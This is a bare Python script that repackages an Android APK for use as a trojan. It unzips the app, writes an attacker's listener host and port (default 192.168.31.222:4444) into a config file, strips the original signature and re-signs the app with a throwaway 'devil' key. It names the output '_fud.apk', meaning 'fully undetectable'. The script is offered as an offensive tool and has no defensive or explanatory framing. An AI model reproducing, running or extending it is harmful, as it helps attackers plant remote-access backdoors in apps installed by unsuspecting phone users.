#!/usr/bin/env python3
import os, sys, shutil, zipfile, tempfile, subprocess
LHOST=os.getenv("LHOST","192.168.31.222").strip()
LPORT=os.getenv("LPORT","4444").strip()
def log(m): print(m,flush=True)
def inject(inp,out):
    tmp=tempfile.mkdtemp()
    try:
        with zipfile.ZipFile(inp,'r') as zin: zin.extractall(tmp)
        a=os.path.join(tmp,"assets"); os.makedirs(a,exist_ok=True)
        open(os.path.join(a,"config.txt"),"w").write(f"{LHOST}:{LPORT}\n")
        mf=os.path.join(tmp,"META-INF")
        if os.path.exists(mf): shutil.rmtree(mf)
        with zipfile.ZipFile(out,'w',zipfile.ZIP_DEFLATED) as z:
            for r,_,fs in os.walk(tmp):
                for f in fs:
                    fp=os.path.join(r,f); z.write(fp, os.path.relpath(fp,tmp))
        log(f"injected {os.path.getsize(out)}")
    finally: shutil.rmtree(tmp,ignore_errors=True)
def sign(apk):
    try:
        ks="devil.keystore"
        if not os.path.exists(ks):
            subprocess.check_call(f'keytool -genkey -keyalg RSA -alias devil -keystore {ks} -storepass 123456 -keypass 123456 -dname "CN=Devil, OU=Devil, O=Devil, L=Devil, ST=Devil, C=IN" -validity 10000',shell=True)
        subprocess.check_call(f'jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore {ks} -storepass 123456 {apk} devil',shell=True)
        log("signed")
        return True
    except Exception as e:
        log(f"sign fail {e}")
        return False
if __name__=="__main__":
    inp=sys.argv[1]; out=sys.argv[2] if len(sys.argv)>2 else inp.replace(".apk","_fud.apk")
    inject(inp,out)
    if not sign(out):
        log("fallback copy")
        shutil.copy(inp,out)
    log(f"done {out}")
